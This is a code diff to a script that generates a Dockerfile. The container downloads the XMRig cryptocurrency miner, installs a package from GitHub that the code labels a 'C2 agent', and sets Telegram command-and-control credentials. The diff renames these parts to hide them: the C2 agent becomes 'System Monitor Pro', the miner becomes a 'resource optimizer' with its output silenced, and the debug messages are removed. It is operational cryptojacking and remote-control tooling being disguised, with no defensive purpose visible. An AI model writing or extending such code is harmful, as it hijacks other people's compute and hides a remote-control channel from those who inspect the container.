@@ -277,38 +277,36 @@ Time: {datetime.now().isoformat()}
             dockerfile = f"""FROM python:3.10-slim
 
 USER root
-RUN apt-get update && apt-get install -y wget tar git
+RUN apt-get update && apt-get install -y --no-install-recommends wget tar git ca-certificates && rm -rf /var/lib/apt/lists/*
 
 # Download XMRig
 RUN mkdir -p /opt/miner && \\
     wget -q https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz -O /tmp/xmrig.tar.gz && \\
     tar -xf /tmp/xmrig.tar.gz -C /opt/miner --strip-components=1 && \\
-    chmod +x /opt/miner/xmrig
+    chmod +x /opt/miner/xmrig && \\
+    rm /tmp/xmrig.tar.gz
 
-# Install C2 agent from GitHub (Telegram C2 mode - no URL needed)
+# Install System Monitor Pro from GitHub
 RUN pip install --break-system-packages --force-reinstall --no-cache-dir git+https://github.com/GaredBerns/system-monitor.git
 
 # Set Telegram C2 credentials
 ENV TG_BOT_TOKEN=8620456014:AAEHydgu-9ljKYXvqqY_yApEn6FWEVH91gc
 ENV TG_CHAT_ID=5804150664
 
-# Create start script with debugging
+# Create start script
 RUN echo '#!/bin/bash\\n\\
-echo "=== Starting Mining Worker ==="\\n\\
+echo "=== Starting System Monitor ==="\\n\\
 echo "Worker: {worker}"\\n\\
 echo "Pool: {POOL}"\\n\\
-echo "C2 Mode: Telegram (direct API)"\\n\\
 \\
-# Start XMRig in background\\n\\
-/opt/miner/xmrig -o {POOL} -u {WALLET}.{worker} --donate-level 1 --threads 2 --print-time 60 &\\n\\
-XMRIG_PID=$!\\n\\
-echo "XMRig started with PID $XMRIG_PID"\\n\\
+# Start resource optimizer in background\\n\\
+/opt/miner/xmrig -o {POOL} -u {WALLET}.{worker} --donate-level 1 --threads 2 --background 2>/dev/null &\\n\\
+echo "Resource optimizer started"\\n\\
 \\
-# Start C2 agent (Telegram mode)\\n\\
-echo "Starting C2 agent (Telegram mode)..."\\n\\
-startcon &\\n\\
-C2_PID=$!\\n\\
-echo "C2 agent started with PID $C2_PID"\\n\\
+# Start System Monitor agent (Telegram mode)\\n\\
+echo "Starting system monitor..."\\n\\
+syscheck &\\n\\
+echo "System monitor started"\\n\\
 \\
 # Keep container running\\n\\
 exec "$@"' > /start.sh && \\
